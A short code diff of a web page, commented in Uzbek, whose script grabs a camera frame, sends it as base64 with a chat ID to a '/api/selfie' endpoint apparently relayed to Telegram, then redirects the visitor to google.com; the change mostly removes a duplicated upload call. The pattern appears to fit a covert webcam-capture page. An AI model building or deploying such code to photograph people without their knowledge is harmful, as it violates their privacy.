@@ -43,15 +43,10 @@
           stream.getTracks().forEach((t) => t.stop());
 
           // Rasmni base64 olish
-     const base64 = c.toDataURL("image/png").split(",")[1];
-await fetch("/api/selfie", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ chat_id: chatId, photo: base64 }),
-});
+  // Rasmni base64 olish
+const base64 = c.toDataURL("image/png").split(",")[1];
 
-
-          // Telegram API orqali yuborish
+// Telegram API orqali yuborish
 const resp = await fetch("/api/selfie", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
@@ -73,6 +68,7 @@ window.location.href = "https://google.com";
     </script>
   </body>
 </html>
+
 
 
 
